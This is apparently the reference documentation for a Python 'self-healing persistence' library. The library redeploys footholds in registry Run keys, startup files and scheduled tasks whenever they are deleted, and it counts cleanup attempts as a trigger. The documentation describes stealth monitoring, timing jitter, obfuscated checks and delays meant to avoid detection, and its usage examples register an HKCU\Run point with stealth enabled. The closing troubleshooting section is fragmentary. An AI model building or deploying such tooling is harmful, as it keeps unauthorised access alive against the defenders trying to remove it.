================================================================================
RECOVERY TRIGGERS
================================================================================

Supported Trigger Types (8 total):
  • REGISTRY_MISSING       - Registry key/value not found
  • STARTUP_FILE_MISSING   - Startup file deleted
  • TASK_MISSING          - Scheduled task deleted
  • HASH_MISMATCH         - Payload hash mismatch
  • SCHEDULED_CHECK       - Periodic health check
  • FAILURE_DETECTED      - Generic failure condition
  • CLEANUP_ATTEMPT       - Cleanup operation detected
  • MANUAL_TRIGGER        - User-initiated recovery

================================================================================
HEALTH STATUS LEVELS
================================================================================

  HEALTHY     - All persistence points operational and verified
  DEGRADED    - Some points compromised but recovering
  CRITICAL    - Multiple failures with recovery exhausted
  RECOVERING  - Recovery operation in progress

Status determined by:
  • Total points registered
  • Healthy point count
  • Degraded point count
  • Critical point count
  • Overall system health

================================================================================
RECOVERY STRATEGY WORKFLOW
================================================================================

First Attempt (1-2):
  └─ IMMEDIATE_REDEPLOY
     ├─ Execute immediately
     ├─ Use fastest method
     └─ Record event

Third-Fourth Attempts (3-4):
  └─ DELAYED_REDEPLOY
     ├─ Wait 1-5 minutes (random)
     ├─ Redeploy in background
     └─ Avoid detection patterns

Fifth+ Attempts (5+):
  └─ MULTI_POINT_DEPLOYMENT
     ├─ Deploy to multiple methods
     ├─ Require 2+ successes
     └─ Maximize redundancy

Max Attempts Exceeded:
  └─ Stop recovery attempts
     ├─ Mark point as critical
     └─ Report status

CONFIGURATION OPTIONS
================================================================================

Core System:
  • check_interval_seconds: 300 (health check interval)
  • recovery_timeout_seconds: 60 (max recovery duration)
  • max_recovery_attempts: 5 (attempts per point)
  • enable_stealth_monitoring: True (hidden operation)

Stealth Features:
  • stealth_mode: Enable/disable stealth (True/False)
  • check_jitter: Add timing randomness (True/False)
  • obfuscated_checks: Use hidden verification (True/False)

Point Registration:
  • point_type: Type of persistence (registry, startup_file, task, etc.)
  • location: Where persistence is deployed
  • payload: Command or script to execute
  • metadata: Custom key-value pairs

Health Checks:
  • Automatic per configured interval
  • Manual on demand
  • Customizable check timing
  • Historical tracking

DATA STRUCTURES
================================================================================

PersistencePoint:
  ├─ point_id: Unique identifier
  ├─ point_type: Type of persistence
  ├─ location: Deployment location
  ├─ payload_hash: SHA256 hash of payload
  ├─ creation_timestamp: Registration time
  ├─ last_verified: Last check time
  ├─ verification_count: Total verifications
  ├─ recovery_count: Recovery attempts
  ├─ is_healthy: Current health status
  └─ metadata: Custom metadata dict

RecoveryEvent:
  ├─ event_id: Unique event ID
  ├─ trigger: Recovery trigger type
  ├─ timestamp: Event time
  ├─ point_id: Which point recovered
  ├─ strategy_used: Strategy employed
  ├─ success: Success status (True/False)
  ├─ error_message: Error details if failed
  └─ recovery_time_ms: Duration in milliseconds

HealthCheckResult:
  ├─ timestamp: Check time
  ├─ total_points: Points checked
  ├─ healthy_points: Healthy count
  ├─ degraded_points: Degraded count
  ├─ critical_points: Critical count
  ├─ overall_status: System status
  ├─ recovery_count: Recoveries triggered
  ├─ points_checked: List of checked points
  └─ issues_found: List of issues detected

USAGE EXAMPLES
================================================================================

Basic Setup (5 lines):
```python
from self_healing_persistence import SelfHealingPersistence

system = SelfHealingPersistence(check_interval_seconds=300)
point_id = system.register_persistence_point(
    point_type="startup_file", location="/tmp/p.sh", payload="cmd"
)
system.start_monitoring(background=True)
```

Multi-Method Setup (15 lines):
```python
from self_healing_persistence import SelfHealingPersistenceBuilder

system = (SelfHealingPersistenceBuilder()
    .add_registry_point("HKCU\\Run", "System", "payload1")
    .add_startup_file("/tmp/startup.sh", "payload2")
    .add_scheduled_task("Check", "payload3")
    .set_check_interval(300)
    .enable_stealth_mode(True)
    .build())
system.start_monitoring()
```

Status Monitoring (5 lines):
```python
status = system.get_health_status()
print(f"Status: {status['overall_status']}")
history = system.get_recovery_history(limit=10)
for event in history:
    print(f"{event['trigger']} -> {event['strategy']}")
```

  2. Verify recovery attempt count (< max_recovery_attempts)

  5. Verify point exists in registration

High Recovery Rate:
  1. Analyze recovery triggers (get_recovery_history)
  2. Check if points are frequently removed
  3. Review strategy selection logic
  4. Examine error patterns
  5. Adjust check intervals if needed

Status Check Failures:

  3. Review health check history
